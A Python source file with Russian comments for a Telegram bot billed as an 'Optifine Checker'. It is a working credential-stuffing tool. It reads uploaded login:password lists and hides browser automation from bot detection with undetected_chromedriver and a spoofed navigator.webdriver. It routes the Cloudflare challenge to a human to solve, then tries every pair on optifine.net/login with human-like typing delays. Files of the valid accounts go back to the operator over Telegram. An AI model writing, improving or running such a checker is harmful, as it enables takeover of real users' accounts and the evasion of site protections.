import os
import sys
import logging
import asyncio
import aiofiles
import time
import random
import subprocess
import tempfile
import pickle
import signal
from datetime import datetime
from typing import Dict, List, Tuple

# Используем undetected_chromedriver
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/app/debug/bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА! Установи BOT_TOKEN в переменных окружения")
    sys.exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

# Хранилище сессий для ручного подтверждения
pending_confirmations = {}

# Создаем директории
os.makedirs('/app/debug', exist_ok=True)
os.makedirs('/app/sessions', exist_ok=True)

class OptifineChecker:
    """Проверка аккаунтов с возможностью ручного подтверждения Cloudflare"""
    
    def __init__(self):
        self.driver = None
        self.session_id = None
        self.xvfb_process = None
        logger.info("🚀 Инициализация OptifineChecker...")
    
    def start_xvfb(self):
        """Запускает Xvfb для эмуляции дисплея"""
        try:
            # Проверяем, не запущен ли уже Xvfb
            result = subprocess.run(['pgrep', 'Xvfb'], capture_output=True)
            if result.returncode == 0:
                logger.info("✅ Xvfb уже запущен")
                return True
            
            # Запускаем Xvfb
            logger.info("🖥️ Запускаю Xvfb...")
            self.xvfb_process = subprocess.Popen(
                ['Xvfb', ':99', '-screen', '0', '1920x1080x24'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Устанавливаем DISPLAY
            os.environ['DISPLAY'] = ':99'
            
            # Ждем запуска
            time.sleep(2)
            
            logger.info("✅ Xvfb запущен")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка запуска Xvfb: {e}")
            return False
    
    def stop_xvfb(self):
        """Останавливает Xvfb"""
        if self.xvfb_process:
            try:
                self.xvfb_process.terminate()
                self.xvfb_process.wait(timeout=5)
                logger.info("✅ Xvfb остановлен")
            except:
                pass
    
    def init_driver(self, headless=False):
        """Инициализация драйвера"""
        try:
            # Запускаем Xvfb если нужно
            if not headless:
                if not self.start_xvfb():
                    logger.error("❌ Не удалось запустить Xvfb")
                    return False
            
            logger.info("🔍 Определяю версию Chrome...")
            
            # Получаем версию Chrome
            try:
                chrome_version_output = subprocess.check_output(['google-chrome', '--version']).decode().strip()
                chrome_version = chrome_version_output.split(' ')[-1].split('.')[0]
                logger.info(f"✅ Обнаружена версия Chrome: {chrome_version}")
            except Exception as e:
                chrome_version = 145
                logger.warning(f"⚠️ Использую версию по умолчанию: {chrome_version}. Ошибка: {e}")
            
            # Создаем временную директорию для профиля
            user_data_dir = tempfile.mkdtemp()
            
            # Настройки Chrome
            options = uc.ChromeOptions()
            
            # Основные настройки
            if headless:
                options.add_argument('--headless=new')
            
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--start-maximized')
            options.add_argument('--disable-gpu')
            
            # Отключаем признаки автоматизации
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--disable-web-security')
            options.add_argument('--allow-running-insecure-content')
            
            # Языковые настройки
            options.add_argument('--lang=en-US,en;q=0.9')
            
            # Реальный User-Agent
            options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36')
            
            # Отключаем логи
            options.add_argument('--disable-logging')
            options.add_argument('--log-level=3')
            options.add_argument('--silent')
            
            # Игнорируем ошибки SSL
            options.add_argument('--ignore-certificate-errors')
            options.add_argument('--ignore-ssl-errors')
            
            # Важно для стабильности
            options.add_argument('--remote-debugging-port=9222')
            
            # Используем реальный профиль
            options.add_argument(f'--user-data-dir={user_data_dir}')
            options.add_argument('--profile-directory=Default')
            
            # Дополнительные настройки для видимого режима
            if not headless:
                options.add_argument('--disable-blink-features=AutomationControlled')
                options.add_argument('--disable-features=VizDisplayCompositor')
                options.add_argument('--disable-features=IsolateOrigins')
                options.add_argument('--disable-features=site-per-process')
            
            logger.info(f"🚀 Запускаю undetected_chromedriver в режиме {'headless' if headless else 'visible'}...")
            
            self.driver = uc.Chrome(
                options=options,
                version_main=int(chrome_version),
                headless=headless
            )
            
            # Устанавливаем таймауты
            self.driver.set_page_load_timeout(60)
            self.driver.implicitly_wait(10)
            
            # Маскировка
            self.driver.execute_script("""
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                window.chrome = {runtime: {}};
            """)
            
            logger.info("✅ Драйвер успешно инициализирован")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            logger.exception("Детали ошибки:")
            return False
    
    def save_session(self, session_id):
        """Сохраняет сессию для ручного подтверждения"""
        try:
            # Сохраняем cookies
            cookies = self.driver.get_cookies()
            with open(f'/app/sessions/{session_id}.pkl', 'wb') as f:
                pickle.dump(cookies, f)
            
            # Сохраняем URL
            with open(f'/app/sessions/{session_id}_url.txt', 'w') as f:
                f.write(self.driver.current_url)
            
            logger.info(f"💾 Сессия {session_id} сохранена")
            return True
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения сессии: {e}")
            return False
    
    def load_session(self, session_id):
        """Загружает сохраненную сессию"""
        try:
            # Загружаем URL
            with open(f'/app/sessions/{session_id}_url.txt', 'r') as f:
                url = f.read().strip()
            
            # Переходим по URL
            self.driver.get(url)
            time.sleep(3)
            
            # Загружаем cookies
            with open(f'/app/sessions/{session_id}.pkl', 'rb') as f:
                cookies = pickle.load(f)
                for cookie in cookies:
                    try:
                        self.driver.add_cookie(cookie)
                    except:
                        pass
            
            # Обновляем страницу
            self.driver.refresh()
            time.sleep(3)
            
            logger.info(f"✅ Сессия {session_id} загружена")
            return True
        except Exception as e:
            logger.error(f"❌ Ошибка загрузки сессии: {e}")
            return False
    
    def check_cloudflare_passed(self):
        """Проверяет, пройдена ли Cloudflare защита"""
        try:
            current_url = self.driver.current_url
            page_title = self.driver.title.lower()
            page_source = self.driver.page_source
            
            # Проверяем признаки Cloudflare
            if 'just a moment' in page_title:
                return False
            
            if 'cf-chl-widget' in page_source or 'turnstile' in page_source:
                return False
            
            # Проверяем наличие полей ввода (признак страницы входа)
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            visible_inputs = [i for i in inputs if i.is_displayed() and 
                             i.get_attribute('type') not in ['hidden']]
            
            if len(visible_inputs) >= 1:
                logger.info("✅ Cloudflare пройден, найдены поля ввода")
                return True
            
            # Проверяем URL
            if 'login' in current_url:
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"❌ Ошибка проверки Cloudflare: {e}")
            return False
    
    async def wait_for_manual_confirmation(self, update, context, session_id, timeout=300):
        """Ожидает ручного подтверждения от пользователя"""
        
        start_time = time.time()
        check_interval = 5
        
        while time.time() - start_time < timeout:
            try:
                # Проверяем, пройдена ли Cloudflare
                if self.check_cloudflare_passed():
                    logger.info(f"✅ Cloudflare пройден для сессии {session_id}")
                    return True
                
                # Обновляем страницу каждые 30 секунд
                elapsed = int(time.time() - start_time)
                if elapsed % 30 == 0 and elapsed > 0:
                    logger.info(f"🔄 Обновляю страницу (прошло {elapsed}с)")
                    try:
                        self.driver.refresh()
                    except:
                        pass
                
                # Отправляем статус каждые 30 секунд
                if elapsed % 30 == 0 and elapsed > 0:
                    try:
                        await update.message.reply_text(
                            f"⏳ **Ожидание подтверждения...**\n"
                            f"Прошло: {elapsed}с\n"
                            f"Осталось: {timeout - elapsed}с\n\n"
                            f"🆔 ID: `{session_id}`"
                        )
                    except:
                        pass
                
                await asyncio.sleep(check_interval)
                
            except Exception as e:
                logger.error(f"❌ Ошибка при ожидании: {e}")
                await asyncio.sleep(check_interval)
        
        logger.warning(f"⚠️ Таймаут ожидания для сессии {session_id}")
        return False
    
    async def setup_manual_cloudflare(self, update, context):
        """Настраивает ручное прохождение Cloudflare"""
        
        # Генерируем уникальный ID сессии
        session_id = f"{update.effective_user.id}_{int(time.time())}"
        
        try:
            # Открываем страницу входа
            logger.info("🌐 Открываю страницу входа...")
            self.driver.get("https://optifine.net/login")
            time.sleep(5)
            
            # Сохраняем скриншот
            self.driver.save_screenshot(f'/app/debug/cloudflare_{session_id}.png')
            
            # Проверяем, может Cloudflare уже пройден?
            if self.check_cloudflare_passed():
                logger.info("✅ Cloudflare уже пройден!")
                return True
            
            # Сохраняем сессию
            self.save_session(session_id)
            
            # Получаем текущий URL
            current_url = self.driver.current_url
            
            # Создаем клавиатуру с кнопками
            keyboard = [
                [InlineKeyboardButton("✅ Я прошел капчу", callback_data=f"cf_done_{session_id}")],
                [InlineKeyboardButton("🔄 Обновить страницу", callback_data=f"cf_refresh_{session_id}")],
                [InlineKeyboardButton("❌ Отмена", callback_data=f"cf_cancel_{session_id}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            # Отправляем сообщение с инструкцией
            await update.message.reply_text(
                f"⚠️ **Требуется ручное подтверждение Cloudflare**\n\n"
                f"1️⃣ **Перейди по ссылке:**\n"
                f"{current_url}\n\n"
                f"2️⃣ **Нажми на галочку** \"I am human\" или \"Verify\"\n\n"
                f"3️⃣ **После прохождения нажми кнопку** \"✅ Я прошел капчу\"\n\n"
                f"⏳ **У тебя есть 5 минут**\n"
                f"🆔 ID сессии: `{session_id}`",
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
            
            # Сохраняем информацию о сессии
            pending_confirmations[session_id] = {
                'user_id': update.effective_user.id,
                'chat_id': update.effective_chat.id,
                'message_id': update.message.message_id,
                'checker': self,
                'start_time': time.time()
            }
            
            # Ожидаем подтверждения
            result = await self.wait_for_manual_confirmation(update, context, session_id)
            
            # Удаляем из ожидающих
            if session_id in pending_confirmations:
                del pending_confirmations[session_id]
            
            return result
            
        except Exception as e:
            logger.error(f"❌ Ошибка при настройке ручного Cloudflare: {e}")
            if session_id in pending_confirmations:
                del pending_confirmations[session_id]
            return False
    
    async def handle_confirmation_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обрабатывает нажатия кнопок подтверждения"""
        query = update.callback_query
        await query.answer()
        
        data = query.data
        session_id = data.split('_')[-1]
        
        if session_id not in pending_confirmations:
            await query.edit_message_text("❌ **Сессия устарела или не найдена**")
            return
        
        session_info = pending_confirmations[session_id]
        
        # Проверяем, что это тот же пользователь
        if query.from_user.id != session_info['user_id']:
            await query.answer("❌ Это не ваша сессия!", show_alert=True)
            return
        
        if data.startswith('cf_done'):
            # Пользователь утверждает, что прошел капчу
            await query.edit_message_text("✅ **Проверяю...**")
            
            # Проверяем, действительно ли пройдена Cloudflare
            if session_info['checker'].check_cloudflare_passed():
                await query.edit_message_text(
                    "✅ **Cloudflare успешно пройден!**\n\n"
                    "Продолжаю проверку аккаунтов..."
                )
                return True
            else:
                await query.edit_message_text(
                    "❌ **Cloudflare все еще активен**\n\n"
                    "Попробуй еще раз нажать на галочку и обновить страницу."
                )
        
        elif data.startswith('cf_refresh'):
            # Обновляем страницу
            await query.edit_message_text("🔄 **Обновляю страницу...**")
            try:
                session_info['checker'].driver.refresh()
                await query.edit_message_text(
                    f"✅ **Страница обновлена**\n\n"
                    f"Текущий URL:\n"
                    f"{session_info['checker'].driver.current_url}"
                )
            except Exception as e:
                await query.edit_message_text(f"❌ **Ошибка при обновлении:** {str(e)[:100]}")
        
        elif data.startswith('cf_cancel'):
            # Отменяем операцию
            await query.edit_message_text("❌ **Операция отменена**")
            del pending_confirmations[session_id]
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка аккаунта"""
        logger.info(f"🔍 Проверяю: {login[:20]}...")
        
        if not self.driver:
            return {'login': login, 'status': 'error', 'error': 'Драйвер не инициализирован'}
        
        try:
            # Поиск поля логина
            email_field = None
            email_selectors = [
                "//input[@name='username']",
                "//input[@name='email']",
                "//input[@type='text']",
                "//input[@type='email']",
                "//input[@placeholder='Username']",
                "//input[@placeholder='Email']"
            ]
            
            for selector in email_selectors:
                elements = self.driver.find_elements(By.XPATH, selector)
                for element in elements:
                    if element.is_displayed():
                        email_field = element
                        logger.info(f"✅ Найдено поле логина")
                        break
                if email_field:
                    break
            
            if not email_field:
                return {'login': login, 'status': 'error', 'error': 'Поле логина не найдено'}
            
            # Поиск поля пароля
            password_field = None
            password_selectors = [
                "//input[@type='password']",
                "//input[@name='password']",
                "//input[@name='pass']"
            ]
            
            for selector in password_selectors:
                elements = self.driver.find_elements(By.XPATH, selector)
                for element in elements:
                    if element.is_displayed():
                        password_field = element
                        logger.info(f"✅ Найдено поле пароля")
                        break
                if password_field:
                    break
            
            if not password_field:
                return {'login': login, 'status': 'error', 'error': 'Поле пароля не найдено'}
            
            # Поиск кнопки входа
            submit_button = None
            submit_selectors = [
                "//button[@type='submit']",
                "//input[@type='submit']",
                "//button[contains(text(), 'Login')]",
                "//button[contains(text(), 'Sign in')]"
            ]
            
            for selector in submit_selectors:
                elements = self.driver.find_elements(By.XPATH, selector)
                for element in elements:
                    if element.is_displayed() and element.is_enabled():
                        submit_button = element
                        logger.info(f"✅ Найдена кнопка входа")
                        break
                if submit_button:
                    break
            
            if not submit_button:
                return {'login': login, 'status': 'error', 'error': 'Кнопка не найдена'}
            
            # Очищаем поля
            try:
                email_field.clear()
            except:
                pass
            try:
                password_field.clear()
            except:
                pass
            
            # Вводим логин
            logger.info(f"✍️ Ввожу логин...")
            for char in login:
                email_field.send_keys(char)
                time.sleep(random.uniform(0.03, 0.07))
            
            time.sleep(random.uniform(0.5, 1))
            
            # Вводим пароль
            logger.info(f"✍️ Ввожу пароль...")
            for char in password:
                password_field.send_keys(char)
                time.sleep(random.uniform(0.03, 0.07))
            
            time.sleep(random.uniform(0.5, 1))
            
            # Нажимаем кнопку
            logger.info("🖱️ Нажимаю кнопку входа")
            try:
                submit_button.click()
            except:
                self.driver.execute_script("arguments[0].click();", submit_button)
            
            # Ждем результат
            time.sleep(5)
            
            # Анализируем результат
            current_url = self.driver.current_url
            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            
            if 'downloads' in current_url or 'profile' in current_url:
                logger.info(f"✅ РАБОЧИЙ АККАУНТ: {login[:20]}")
                return {
                    'login': login,
                    'password': password,
                    'status': 'valid'
                }
            elif 'invalid' in page_text or 'incorrect' in page_text:
                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': 'Неверный логин/пароль'
                }
            else:
                logger.info(f"⚠️ НЕОПРЕДЕЛЕННЫЙ РЕЗУЛЬТАТ: {login[:20]}")
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': 'Неопределенный результат'
                }
            
        except Exception as e:
            logger.error(f"❌ Ошибка при проверке: {e}")
            return {'login': login, 'status': 'error', 'error': str(e)[:100]}
    
    def close(self):
        """Закрытие драйвера"""
        if self.driver:
            try:
                self.driver.quit()
                logger.info("✅ Драйвер закрыт")
            except:
                pass
        self.stop_xvfb()

# --- Telegram handlers ---

async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отправка файлов отладки"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    try:
        if not os.path.exists('/app/debug'):
            await update.message.reply_text("📁 Папка /app/debug не найдена")
            return
        
        files = os.listdir('/app/debug')
        if not files:
            await update.message.reply_text("📁 Папка debug пуста")
            return
        
        files.sort(key=lambda x: os.path.getmtime(os.path.join('/app/debug', x)), reverse=True)
        
        sent = 0
        for file in files[:5]:
            file_path = os.path.join('/app/debug', file)
            if os.path.getsize(file_path) > 10 * 1024 * 1024:  # 10MB
                continue
                
            with open(file_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=file,
                    caption=f"📁 **Debug:** `{file}`"
                )
            sent += 1
            await asyncio.sleep(1)
        
        await update.message.reply_text(f"✅ Отправлено файлов: {sent}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {e}")

async def process_file(file_path, update, context):
    """Обработка файла с аккаунтами"""
    
    checker = OptifineChecker()
    results = {'valid': [], 'invalid': [], 'errors': []}
    
    msg = await update.message.reply_text("🚀 **Запускаю проверку...**")
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
            content = await f.read()
        
        # Парсим аккаунты
        accounts = []
        for line in content.strip().split('\n'):
            line = line.strip()
            if ':' in line:
                login, password = line.split(':', 1)
                accounts.append((login.strip(), password.strip()))
        
        total = len(accounts)
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов**")
            return
        
        await msg.edit_text(f"📊 Аккаунтов: {total}\n\n🛡️ **Настраиваю ручное прохождение Cloudflare...**")
        
        # Инициализируем драйвер (visible режим с Xvfb)
        if not checker.init_driver(headless=False):
            await msg.edit_text(
                "❌ **Ошибка инициализации драйвера**\n\n"
                "Проверь логи через /debug"
            )
            return
        
        # Запрашиваем ручное прохождение Cloudflare
        success = await checker.setup_manual_cloudflare(update, context)
        
        if not success:
            await msg.edit_text(
                "❌ **Cloudflare не пройден**\n\n"
                "Возможные причины:\n"
                "• Таймаут ожидания (5 минут)\n"
                "• Не удалось пройти капчу\n\n"
                "Попробуй еще раз через /start"
            )
            checker.close()
            return
        
        # Cloudflare пройден, начинаем проверку
        await msg.edit_text(
            f"✅ **Cloudflare пройден!**\n\n"
            f"📊 Начинаю проверку {total} аккаунтов..."
        )
        
        start_time = time.time()
        
        for i, (login, password) in enumerate(accounts, 1):
            if i % 3 == 0 or i == total:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"✅ **Рабочих:** {len(results['valid'])}\n"
                    f"⏱ **Время:** {elapsed:.0f}с"
                )
            
            # Проверяем аккаунт
            result = await checker.check_account(login, password)
            
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
                logger.info(f"✅ РАБОЧИЙ: {login[:20]}")
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
                logger.info(f"⚠️ ОШИБКА: {login[:20]}")
            
            bot_stats['total'] += 1
            await asyncio.sleep(2)
        
        # Отправляем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        if results['invalid']:
            invalid_file = f"❌_НЕРАБОЧИЕ_{len(results['invalid'])}шт_{timestamp}.txt"
            async with aiofiles.open(invalid_file, 'w') as f:
                for acc in results['invalid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            with open(invalid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=invalid_file,
                    caption=f"❌ **Нерабочих: {len(results['invalid'])}**"
                )
            os.remove(invalid_file)
        
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• ❌ Нерабочих: {len(results['invalid'])}\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        checker.close()
        if os.path.exists(file_path):
            os.remove(file_path)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **Optifine Checker с ручным подтверждением**\n\n"
        f"🔍 **Как это работает:**\n"
        f"1️⃣ Отправляешь .txt файл с аккаунтами\n"
        f"2️⃣ Бот открывает страницу с Cloudflare\n"
        f"3️⃣ Ты вручную нажимаешь на галочку\n"
        f"4️⃣ Бот продолжает проверку автоматически\n\n"
        f"📥 **Отправь .txt файл** с логинами:паролями\n\n"
        f"🔧 **Для админов:** /debug",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка кнопок"""
    query = update.callback_query
    
    # Проверяем, это кнопка подтверждения Cloudflare?
    if query.data and query.data.startswith('cf_'):
        # Создаем временный экземпляр для обработки
        checker = OptifineChecker()
        await checker.handle_confirmation_callback(update, context)
        return
    
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Нерабочих: {bot_stats['invalid']}\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **ПОМОЩЬ**\n\n"
            "1. Создай .txt файл\n"
            "2. В каждой строке: логин:пароль\n"
            "3. Отправь файл боту\n"
            "4. Перейди по ссылке и нажми на галочку\n"
            "5. Нажми \"✅ Я прошел капчу\"\n"
            "6. Бот продолжит проверку"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    if doc.file_size > 10 * 1024 * 1024:  # 10MB
        await update.message.reply_text("❌ **Файл слишком большой (>10MB)**")
        return
    
    try:
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    print("=" * 50)
    print("🚀 ЗАПУСК OPTIFINE CHECKER (РУЧНОЙ РЕЖИМ)")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("debug", debug_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН!")
    print("=" * 50)
    
    try:
        app.run_polling()
    except Exception as e:
        logger.error(f"Ошибка: {e}")
    finally:
        print("👋 Бот остановлен")

if __name__ == '__main__':
    main()